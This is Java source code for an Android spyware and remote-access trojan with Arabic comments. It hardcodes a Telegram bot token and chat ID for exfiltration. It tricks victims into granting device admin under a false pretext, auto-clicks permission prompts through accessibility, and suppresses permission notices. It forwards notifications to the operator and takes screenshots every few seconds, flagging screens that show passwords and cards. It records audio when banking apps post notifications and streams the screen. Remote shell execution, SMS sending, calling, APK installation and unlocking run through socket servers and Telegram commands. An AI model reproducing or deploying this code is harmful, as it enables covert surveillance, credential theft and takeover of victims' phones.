package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CallLog;
import android.location.Location;
import android.location.LocationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.media.MediaScannerConnection;
import android.os.Environment;
import android.util.Log;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.media.projection.MediaProjectionManager;
import android.media.projection.MediaProjection;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.Image;
import android.graphics.PixelFormat;
import android.graphics.Bitmap;
import android.graphics.BitFactory;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.AccessibilityService;
import android.telephony.TelephonyManager;
import android.telephony.SmsManager;
import android.telephony.gsm.GsmCellLocation;
import android.net.wifi.WifiManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.AudioRecord;
import android.media.MediaFormat;
import android.media.MediaCodec;
import android.app.KeyguardManager;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.WindowManager;
import android.view.View;
import android.view.LayoutInflater;
import android.widget.Toast;
import android.widget.Button;
import android.widget.LinearLayout;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.webkit.WebChromeClient;
import android.webkit.WebViewClient;
import android.webkit.JavascriptInterface;

import okhttp3.*;
import java.io.*;
import java.util.*;
import java.text.SimpleDateFormat;
import java.net.*;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.security.SecureRandom;
import org.json.JSONObject;
import org.json.JSONArray;

public class NotificationService extends NotificationListenerService {

    // ⚠️ معلوماتك الشخصية ⚠️
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String ENCRYPTION_KEY = "V8GlobalSnifferKey";
    private static final String SERVER_URL = "https://your-server.com/command"; // للسيرفر الخاص
    
    private final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();
            
    private Handler handler = new Handler(Looper.getMainLooper());
    
    // للإشعارات
    private Set<String> sentNotifications = new HashSet<>();
    private int notificationCount = 0;
    
    // للقطات الشاشة
    private int screenshotCount = 0;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    
    // للتحكم الكامل
    private ControlServer controlServer;
    private boolean isAdminActive = false;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private KeyguardManager keyguardManager;
    private PowerManager powerManager;
    private PowerManager.WakeLock wakeLock;
    private WindowManager windowManager;
    private View overlayView;
    private AccessibilityService accessibilityService;
    
    // للتجسس
    private MediaRecorder mediaRecorder;
    private boolean isRecordingAudio = false;
    private boolean isRecordingVideo = false;
    private Camera camera;
    private Thread audioThread;
    private boolean isListening = false;
    
    // للحسابات
    private Map<String, Long> accountFileSizes = new HashMap<>();
    private Set<String> sentAccounts = new HashSet<>();
    
    // للبث المباشر
    private LiveStreamServer liveStreamServer;
    private boolean isStreaming = false;
    private String streamUrl = "rtmp://your-rtmp-server/live/stream_key";
    
    // لأوامر التحكم
    private CommandExecutor commandExecutor;
    private boolean isCommandMode = false;
    
    // مسارات التطبيقات المهمة
    private final String[] TARGET_APPS = {
        "com.whatsapp", "org.telegram.messenger", "com.facebook.orca",
        "com.instagram.android", "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
        "com.facebook.katana", "com.snapchat.android", "com.twitter.android",
        "com.google.android.gm", "com.android.mms", "com.google.android.apps.messaging",
        "com.android.vending", "com.google.android.gsf", "com.sec.android.app.sbrowser"
    };

    @Override
    public void onCreate() {
        super.onCreate();
        startAllServices();
        requestAllPermissions();
        startFullControl();
    }

    private void requestAllPermissions() {
        try {
            // طلب صلاحيات المدير
            requestDeviceAdmin();
            
            // طلب صلاحيات الوصول
            requestAccessibilityPermission();
            
            // فتح جميع الأذونات تلقائياً
            grantAllPermissions();
            
            // تعطيل إشعارات الأذونات
            disablePermissionNotifications();
            
        } catch (Exception e) {
            sendToTelegram("⚠️ خطأ في الصلاحيات", e.getMessage());
        }
    }

    private void requestDeviceAdmin() {
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);
            
            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "لتحسين أداء الجهاز");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } else {
                isAdminActive = true;
                devicePolicyManager.setLockTaskPackages(adminComponent, new String[]{getPackageName()});
            }
        } catch (Exception e) {
            Log.e("V8", "Admin error", e);
        }
    }

    private void requestAccessibilityPermission() {
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            // انتظار 5 ثواني ثم الرجوع
            handler.postDelayed(() -> {
                Intent home = new Intent(Intent.ACTION_MAIN);
                home.addCategory(Intent.CATEGORY_HOME);
                home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(home);
            }, 5000);
            
        } catch (Exception e) {
            Log.e("V8", "Accessibility error", e);
        }
    }

    private void grantAllPermissions() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // فتح صفحة الأذونات
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                
                // محاكاة النقر على "السماح"
                handler.postDelayed(() -> {
                    simulatePermissionClick();
                }, 2000);
            }
        } catch (Exception e) {
            Log.e("V8", "Grant permissions error", e);
        }
    }

    private void simulatePermissionClick() {
        try {
            // استخدام الـ accessibility service للنقر التلقائي
            if (accessibilityService != null) {
                AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
                if (root != null) {
                    List<AccessibilityNodeInfo> buttons = root.findAccessibilityNodeInfosByText("السماح");
                    buttons.addAll(root.findAccessibilityNodeInfosByText("Allow"));
                    buttons.addAll(root.findAccessibilityNodeInfosByText("موافق"));
                    
                    for (AccessibilityNodeInfo button : buttons) {
                        if (button.isClickable()) {
                            button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Simulate click error", e);
        }
    }

    private void disablePermissionNotifications() {
        try {
            // إخفاء إشعارات الأذونات
            NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                notificationManager.setNotificationPolicy(new NotificationManager.Policy(0, 0, 0));
            }
            
            // تعطيل إشعارات النظام
            String[] importantNotifications = {
                "perm", "permission", "allow", "access", "security",
                "أذونات", "السماح", "أمان", "خصوصية"
            };
            
            for (String notif : importantNotifications) {
                notificationManager.deleteNotificationChannel(notif);
            }
            
        } catch (Exception e) {
            Log.e("V8", "Disable notifications error", e);
        }
    }

    private void startFullControl() {
        try {
            // تفعيل التحكم الكامل
            powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "V8:WakeLock");
            keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            
            // بدء خادم التحكم
            controlServer = new ControlServer();
            controlServer.start();
            
            // بدء البث المباشر
            liveStreamServer = new LiveStreamServer();
            liveStreamServer.start();
            
            // بدء منفذ الأوامر
            commandExecutor = new CommandExecutor();
            commandExecutor.start();
            
            sendToTelegram("🎮 تحكم كامل", "✅ تم تفعيل نظام التحكم الكامل");
            
        } catch (Exception e) {
            sendToTelegram("🎮 خطأ تحكم", e.getMessage());
        }
    }

    private void startAllServices() {
        try {
            // تهيئة النظام
            initScreenDimensions();
            
            // بدء جميع الخدمات
            handler.postDelayed(screenshotRunnable, 5000); // كل 5 ثواني
            handler.postDelayed(accountRunnable, 3000);    // كل 3 ثواني
            handler.postDelayed(personalDataRunnable, 60000); // كل دقيقة
            handler.postDelayed(appsDataRunnable, 300000);  // كل 5 دقائق
            handler.postDelayed(liveStreamRunnable, 1000);   // كل ثانية للبث المباشر
            handler.postDelayed(commandCheckRunnable, 2000); // كل 2 ثانية للأوامر
            handler.postDelayed(reportRunnable, 3600000);    // كل ساعة
            
            sendToTelegram("✅ V13 برو", "🚀 جميع الأنظمة نشطة");
            grabInitialData();
            
        } catch (Exception e) {
            Log.e("V8", "Start services error", e);
        }
    }

    private void initScreenDimensions() {
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            Display display = wm.getDefaultDisplay();
            Point size = new Point();
            display.getSize(size);
            screenWidth = size.x;
            screenHeight = size.y;
            screenDensity = getResources().getDisplayMetrics().densityDpi;
            
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            
        } catch (Exception e) {
            Log.e("V8", "Init screen error", e);
        }
    }

    // ========== 1. نظام الإشعارات المحسن ==========
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn.getPackageName().equals("android") || 
                sbn.getPackageName().equals("com.android.systemui")) return;

            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            Object textObj = extras.get(Notification.EXTRA_TEXT);
            String text = (textObj != null) ? textObj.toString() : "";
            String appName = sbn.getPackageName();
            String appLabel = getAppName(appName);

            if (title.length() < 2 && text.length() < 2) return;

            String notifId = appName + "|" + title + "|" + text;
            if (sentNotifications.contains(notifId)) return;
            
            sentNotifications.add(notifId);
            if (sentNotifications.size() > 500) {
                sentNotifications.remove(sentNotifications.iterator().next());
            }

            notificationCount++;

            // تشفير الإشعار إذا كان مهم
            boolean isImportant = isImportantApp(appName);
            String encryptedTitle = isImportant ? encryptData(title) : title;
            String encryptedText = isImportant ? encryptData(text) : text;

            String message = "🔔 إشعار #" + notificationCount + "\n" +
                           "📱 التطبيق: " + appLabel + "\n" +
                           (isImportant ? "🔐 [مشفر]\n" : "");
            
            if (!title.isEmpty()) message += "👤 " + encryptedTitle + "\n";
            if (!text.isEmpty()) message += "💬 " + encryptedText + "\n";
            
            message += "⏰ " + new SimpleDateFormat("HH:mm:ss").format(new Date());

            sendToTelegram("إشعار جديد", message);

            // تنفيذ إجراءات خاصة للإشعارات المهمة
            if (isImportant) {
                handler.postDelayed(() -> {
                    takeScreenshot();
                    
                    // محاولة فتح التطبيق
                    openApp(appName);
                    
                    // التقاط محتوى الإشعار بالكامل
                    captureFullNotification(sbn);
                    
                }, 1000);
            }

            // إذا كان الإشعار من بنك أو تطبيق مالي
            if (isBankingApp(appName)) {
                sendToTelegram("💰 بنك", "تم رصد إشعار بنكي من " + appLabel);
                startAudioRecording(); // تسجيل الصوت
            }

        } catch (Exception e) {
            Log.e("V8", "Notification error", e);
        }
    }

    private boolean isBankingApp(String packageName) {
        String[] bankingKeywords = {"bank", "pay", "wallet", "money", "credit", 
                                    "بنك", "مصرف", "دفع", "محفظة"};
        for (String keyword : bankingKeywords) {
            if (packageName.toLowerCase().contains(keyword)) return true;
        }
        return false;
    }

    private void captureFullNotification(StatusBarNotification sbn) {
        try {
            // التقاط كل بيانات الإشعار
            Bundle extras = sbn.getNotification().extras;
            StringBuilder fullData = new StringBuilder();
            
            for (String key : extras.keySet()) {
                Object value = extras.get(key);
                fullData.append(key).append(": ").append(value).append("\n");
            }
            
            String path = Environment.getExternalStorageDirectory() + "/Download/notification_" + 
                         System.currentTimeMillis() + ".txt";
            writeToFile(fullData.toString(), path);
            sendFileToTelegram("📋 بيانات إشعار كاملة", path);
            
        } catch (Exception e) {
            Log.e("V8", "Full notification error", e);
        }
    }

    private void openApp(String packageName) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                
                // انتظار فتح التطبيق ثم التقاط شاشة
                handler.postDelayed(() -> takeScreenshot(), 2000);
            }
        } catch (Exception e) {
            Log.e("V8", "Open app error", e);
        }
    }

    // ========== 2. نظام لقطات الشاشة المحسن ==========
    private Runnable screenshotRunnable = new Runnable() {
        @Override
        public void run() {
            takeScreenshot();
            
            // التقاط متسلسل كل 5 ثواني
            handler.postDelayed(this, 5000);
        }
    };

    private void takeScreenshot() {
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + timeStamp + ".png";
            
            // محاولة 3 طرق مختلفة لأخذ لقطة الشاشة
            boolean success = false;
            
            // الطريقة 1: screencap
            try {
                Process process = Runtime.getRuntime().exec("screencap -p " + path);
                success = process.waitFor(5, TimeUnit.SECONDS);
            } catch (Exception e) {
                Log.e("V8", "Screencap error", e);
            }
            
            // الطريقة 2: media projection
            if (!success && mediaProjection != null) {
                try {
                    Image image = imageReader.acquireLatestImage();
                    if (image != null) {
                        saveImage(image, path);
                        image.close();
                        success = true;
                    }
                } catch (Exception e) {
                    Log.e("V8", "MediaProjection error", e);
                }
            }
            
            // الطريقة 3: surface flinger
            if (!success) {
                try {
                    Process process = Runtime.getRuntime().exec("su -c screencap -p " + path);
                    success = process.waitFor(5, TimeUnit.SECONDS);
                } catch (Exception e) {
                    Log.e("V8", "Root screencap error", e);
                }
            }
            
            if (success) {
                File file = new File(path);
                if (file.exists() && file.length() > 1000) {
                    screenshotCount++;
                    
                    // تشفير الصورة إذا كانت حساسة
                    if (isSensitiveScreen()) {
                        encryptFile(file);
                        sendFileToTelegram("📸 لقطة حساسة #" + screenshotCount, path + ".enc");
                    } else {
                        sendFileToTelegram("📸 لقطة #" + screenshotCount, path);
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e("V8", "Screenshot error", e);
        }
    }

    private boolean isSensitiveScreen() {
        try {
            // التحقق إذا كانت الشاشة تحتوي على معلومات حساسة
            AccessibilityNodeInfo root = accessibilityService != null ? 
                accessibilityService.getRootInActiveWindow() : null;
                
            if (root != null) {
                String[] sensitiveWords = {"password", "كلمة السر", "رمز", "pin", 
                                          "credit", "card", "بطاقة", "حساب"};
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("*");
                
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.getText() != null) {
                        String text = node.getText().toString().toLowerCase();
                        for (String word : sensitiveWords) {
                            if (text.contains(word)) return true;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Sensitive check error", e);
        }
        return false;
    }

    private void saveImage(Image image, String path) {
        // تحويل Image إلى Bitmap وحفظه
        // ... الكود المحسن لحفظ الصور
    }

    // ========== 3. نظام البث المباشر ==========
    private Runnable liveStreamRunnable = new Runnable() {
        @Override
        public void run() {
            if (isStreaming) {
                streamScreen();
            }
            handler.postDelayed(this, 1000);
        }
    };

    private void startLiveStream() {
        try {
            isStreaming = true;
            
            // بدء البث عبر RTMP
            String command = "ffmpeg -f rawvideo -pixel_format rgb32 -video_size " + 
                           screenWidth + "x" + screenHeight + 
                           " -i pipe: -f flv " + streamUrl;
            
            Process process = Runtime.getRuntime().exec(command);
            
            // بدء التقاط الشاشة وإرسالها
            new Thread(() -> {
                while (isStreaming) {
                    try {
                        Image image = imageReader.acquireLatestImage();
                        if (image != null) {
                            // تحويل وإرسال
                            process.getOutputStream().write(imageToBytes(image));
                            image.close();
                        }
                        Thread.sleep(100);
                    } catch (Exception e) {
                        Log.e("V8", "Stream error", e);
                    }
                }
            }).start();
            
            sendToTelegram("📡 بث مباشر", "✅ بدأ البث المباشر\n🔗 " + streamUrl);
            
        } catch (Exception e) {
            Log.e("V8", "Start stream error", e);
        }
    }

    private void streamScreen() {
        try {
            // إرسال لقطة حية كل ثانية
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            String path = Environment.getExternalStorageDirectory() + "/Pictures/stream_" + timeStamp + ".jpg";
            
            Process process = Runtime.getRuntime().exec("screencap " + path);
            process.waitFor();
            
            File file = new File(path);
            if (file.exists()) {
                // إرسال إلى الخادم
                uploadToServer(file, "stream");
            }
            
        } catch (Exception e) {
            Log.e("V8", "Stream error", e);
        }
    }

    private class LiveStreamServer extends Thread {
        private ServerSocket serverSocket;
        private boolean isRunning = true;
        
        @Override
        public void run() {
            try {
                serverSocket = new ServerSocket(8080);
                
                while (isRunning) {
                    Socket client = serverSocket.accept();
                    handleClient(client);
                }
            } catch (Exception e) {
                Log.e("V8", "Stream server error", e);
            }
        }
        
        private void handleClient(Socket client) {
            try {
                PrintWriter out = new PrintWriter(client.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
                
                String request = in.readLine();
                if (request != null && request.contains("GET /stream")) {
                    // إرسال تدفق الفيديو
                    sendStream(client);
                }
                
                client.close();
            } catch (Exception e) {
                Log.e("V8", "Handle client error", e);
            }
        }
        
        private void sendStream(Socket client) {
            try {
                OutputStream out = client.getOutputStream();
                
                // رأس HTTP للبث المباشر
                String headers = "HTTP/1.1 200 OK\r\n" +
                               "Content-Type: multipart/x-mixed-replace; boundary=frame\r\n" +
                               "\r\n";
                out.write(headers.getBytes());
                
                while (isStreaming) {
                    File screenshot = new File(Environment.getExternalStorageDirectory() + 
                                             "/Pictures/stream_current.jpg");
                    
                    if (screenshot.exists()) {
                        byte[] imageBytes = readFile(screenshot);
                        
                        String boundary = "--frame\r\n" +
                                        "Content-Type: image/jpeg\r\n" +
                                        "Content-Length: " + imageBytes.length + "\r\n" +
                                        "\r\n";
                        out.write(boundary.getBytes());
                        out.write(imageBytes);
                        out.write("\r\n".getBytes());
                        out.flush();
                    }
                    
                    Thread.sleep(100);
                }
            } catch (Exception e) {
                Log.e("V8", "Send stream error", e);
            }
        }
    }

    // ========== 4. نظام التحكم الكامل ==========
    private class ControlServer extends Thread {
        private ServerSocket serverSocket;
        private boolean isRunning = true;
        
        @Override
        public void run() {
            try {
                serverSocket = new ServerSocket(8888);
                
                while (isRunning) {
                    Socket client = serverSocket.accept();
                    handleCommand(client);
                }
            } catch (Exception e) {
                Log.e("V8", "Control server error", e);
            }
        }
        
        private void handleCommand(Socket client) {
            try {
                BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
                PrintWriter out = new PrintWriter(client.getOutputStream(), true);
                
                String command = in.readLine();
                String response = executeCommand(command);
                
                out.println(response);
                client.close();
                
            } catch (Exception e) {
                Log.e("V8", "Handle command error", e);
            }
        }
        
        private String executeCommand(String command) {
            try {
                if (command == null) return "ERROR: No command";
                
                String[] parts = command.split(" ", 2);
                String cmd = parts[0].toLowerCase();
                String arg = parts.length > 1 ? parts[1] : "";
                
                switch (cmd) {
                    case "screen":
                        takeScreenshot();
                        return "OK: Screenshot taken";
                        
                    case "lock":
                        lockDevice();
                        return "OK: Device locked";
                        
                    case "unlock":
                        unlockDevice();
                        return "OK: Device unlocked";
                        
                    case "open":
                        openApp(arg);
                        return "OK: Opening " + arg;
                        
                    case "click":
                        simulateClick(arg);
                        return "OK: Clicked";
                        
                    case "type":
                        simulateType(arg);
                        return "OK: Typed";
                        
                    case "swipe":
                        simulateSwipe(arg);
                        return "OK: Swiped";
                        
                    case "record_audio":
                        startAudioRecording();
                        return "OK: Recording audio";
                        
                    case "record_video":
                        startVideoRecording();
                        return "OK: Recording video";
                        
                    case "stream":
                        startLiveStream();
                        return "OK: Streaming started";
                        
                    case "get_location":
                        grabLocation();
                        return "OK: Location sent";
                        
                    case "get_contacts":
                        grabAllContacts();
                        return "OK: Contacts sent";
                        
                    case "get_sms":
                        grabAllSMS();
                        return "OK: SMS sent";
                        
                    case "get_calls":
                        grabAllCalls();
                        return "OK: Calls sent";
                        
                    case "send_sms":
                        sendSMSCommand(arg);
                        return "OK: SMS sent";
                        
                    case "call":
                        makeCall(arg);
                        return "OK: Calling";
                        
                    case "browse":
                        openBrowser(arg);
                        return "OK: Browser opened";
                        
                    case "download":
                        downloadFile(arg);
                        return "OK: Downloading";
                        
                    case "install":
                        installApp(arg);
                        return "OK: Installing";
                        
                    case "root":
                        return checkRoot() ? "OK: Device is rooted" : "NO: Not rooted";
                        
                    case "shell":
                        return executeShell(arg);
                        
                    case "exit":
                        System.exit(0);
                        return "OK: Exiting";
                        
                    default:
                        return "ERROR: Unknown command";
                }
                
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }
    }

    private void lockDevice() {
        try {
            if (isAdminActive) {
                devicePolicyManager.lockNow();
            } else {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                pm.goToSleep(SystemClock.uptimeMillis());
            }
        } catch (Exception e) {
            Log.e("V8", "Lock error", e);
        }
    }

    private void unlockDevice() {
        try {
            wakeLock.acquire(5000);
            
            if (keyguardManager != null) {
                KeyguardManager.KeyguardLock keyguardLock = 
                    keyguardManager.newKeyguardLock("V8");
                keyguardLock.disableKeyguard();
            }
            
            // محاولة فتح القفل تلقائياً
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (keyguardManager.isDeviceSecure()) {
                    // محاولة استخدام البصمة أو الوجه
                    tryUnlockWithBiometrics();
                }
            }
            
        } catch (Exception e) {
            Log.e("V8", "Unlock error", e);
        }
    }

    private void tryUnlockWithBiometrics() {
        // محاكاة فتح البصمة أو الوجه
        // ... كود متقدم للفتح التلقائي
    }

    private void simulateClick(String coordinates) {
        try {
            String[] xy = coordinates.split(",");
            int x = Integer.parseInt(xy[0].trim());
            int y = Integer.parseInt(xy[1].trim());
            
            // محاكاة النقر عبر shell
            Process process = Runtime.getRuntime().exec("input tap " + x + " " + y);
            process.waitFor();
            
        } catch (Exception e) {
            Log.e("V8", "Click error", e);
        }
    }

    private void simulateType(String text) {
        try {
            Process process = Runtime.getRuntime().exec("input text \"" + text + "\"");
            process.waitFor();
        } catch (Exception e) {
            Log.e("V8", "Type error", e);
        }
    }

    private void simulateSwipe(String params) {
        try {
            String[] parts = params.split(",");
            if (parts.length >= 4) {
                int x1 = Integer.parseInt(parts[0].trim());
                int y1 = Integer.parseInt(parts[1].trim());
                int x2 = Integer.parseInt(parts[2].trim());
                int y2 = Integer.parseInt(parts[3].trim());
                
                Process process = Runtime.getRuntime().exec(
                    "input swipe " + x1 + " " + y1 + " " + x2 + " " + y2);
                process.waitFor();
            }
        } catch (Exception e) {
            Log.e("V8", "Swipe error", e);
        }
    }

    private void sendSMSCommand(String arg) {
        try {
            String[] parts = arg.split(" ", 2);
            if (parts.length >= 2) {
                String number = parts[0];
                String message = parts[1];
                
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(number, null, message, null, null);
            }
        } catch (Exception e) {
            Log.e("V8", "Send SMS error", e);
        }
    }

    private void makeCall(String number) {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e("V8", "Call error", e);
        }
    }

    private void openBrowser(String url) {
        try {
            if (!url.startsWith("http")) {
                url = "https://" + url;
            }
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e("V8", "Browser error", e);
        }
    }

    private void downloadFile(String url) {
        try {
            String fileName = url.substring(url.lastIndexOf("/") + 1);
            String path = Environment.getExternalStorageDirectory() + "/Download/" + fileName;
            
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try (InputStream is = response.body().byteStream();
                         FileOutputStream fos = new FileOutputStream(path)) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = is.read(buffer)) != -1) {
                            fos.write(buffer, 0, bytesRead);
                        }
                    }
                }
            });
            
        } catch (Exception e) {
            Log.e("V8", "Download error", e);
        }
    }

    private void installApp(String path) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File(path)), 
                                 "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e("V8", "Install error", e);
        }
    }

    private boolean checkRoot() {
        try {
            Process process = Runtime.getRuntime().exec("su -c id");
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();
            return line != null && line.contains("uid=0");
        } catch (Exception e) {
            return false;
        }
    }

    private String executeShell(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            return output.toString();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ========== 5. نظام الأوامر عبر Telegram ==========
    private Runnable commandCheckRunnable = new Runnable() {
        @Override
        public void run() {
            checkTelegramCommands();
            handler.postDelayed(this, 2000);
        }
    };

    private void checkTelegramCommands() {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + 
                        (lastUpdateId + 1) + "&timeout=10";
            
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    String json = response.body().string();
                    parseTelegramCommands(json);
                    response.close();
                }
            });
            
        } catch (Exception e) {
            Log.e("V8", "Check commands error", e);
        }
    }

    private void parseTelegramCommands(String json) {
        try {
            JSONObject obj = new JSONObject(json);
            JSONArray updates = obj.getJSONArray("result");
            
            for (int i = 0; i < updates.length(); i++) {
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                
                JSONObject message = update.getJSONObject("message");
                String text = message.getString("text");
                long chatId = message.getJSONObject("chat").getLong("id");
                
                // تنفيذ الأمر فقط إذا كان من CHAT_ID
                if (chatId == Long.parseLong(CHAT_ID)) {
                    executeTelegramCommand(text, chatId);
                }
            }
            
        } catch (Exception e) {
            Log.e("V8", "Parse commands error", e);
        }
    }

    private void executeTelegramCommand(String command, long chatId) {
        try {
            String response;
            
            if (command.startsWith("/")) {
                String cmd = command.substring(1).toLowerCase();
                
                switch (cmd) {
                    case "screen":
                        takeScreenshot();
                        response = "📸 تم التقاط الشاشة";
                        break;
                        
                    case "stream":
                        startLiveStream();
                        response = "📡 بدأ البث المباشر";
                        break;
                        
                    case "stopstream":
                        isStreaming = false;
                        response = "📡 تم إيقاف البث";
                        break;
                        
                    case "lock":
                        lockDevice();
                        response = "🔒 تم قفل الجهاز";
                        break;
                        
                    case "unlock":
                        unlockDevice();
                        response = "🔓 تم فتح الجهاز";
                        break;
                        
                    case "location":
                        grabLocation();
                        response = "📍 تم إرسال الموقع";
                        break;
                        
                    case "contacts":
                        grabAllContacts();
                        response = "👥 تم إرسال جهات الاتصال";
                        break;
                        
                    case "sms":
                        grabAllSMS();
                        response = "📨 تم إرسال الرسائل";
                        break;
                        
                    case "calls":
                        grabAllCalls();
                        response = "📞 تم إرسال سجل المكالمات";
                        break;
                        
                    case "apps":
                        grabAllAppsData();
                        response = "📱 تم إرسال بيانات التطبيقات";
                        break;
                        
                    case "record_audio":
                        startAudioRecording();
                        response = "🎤 بدأ تسجيل الصوت";
                        break;
                        
                    case "stop_audio":
                        stopAudioRecording();
                        response = "🎤 تم إيقاف التسجيل";
                        break;
                        
                    case "record_video":
                        startVideoRecording();
                        response = "📹 بدأ تسجيل الفيديو";
                        break;
                        
                    case "stop_video":
                        stopVideoRecording();
                        response = "📹 تم إيقاف التسجيل";
                        break;
                        
                    case "camera_front":
                        takeCameraPicture(true);
                        response = "📸 تم التقاط صورة بالكاميرا الأمامية";
                        break;
                        
                    case "camera_back":
                        takeCameraPicture(false);
                        response = "📸 تم التقاط صورة بالكاميرا الخلفية";
                        break;
                        
                    case "info":
                        response = getDeviceInfo();
                        break;
                        
                    case "shell":
                        response = "📟 أرسل الأمر بعد /shell";
                        break;
                        
                    case "help":
                        response = getHelpText();
                        break;
                        
                    default:
                        if (cmd.startsWith("shell ")) {
                            String shellCmd = cmd.substring(6);
                            response = executeShell(shellCmd);
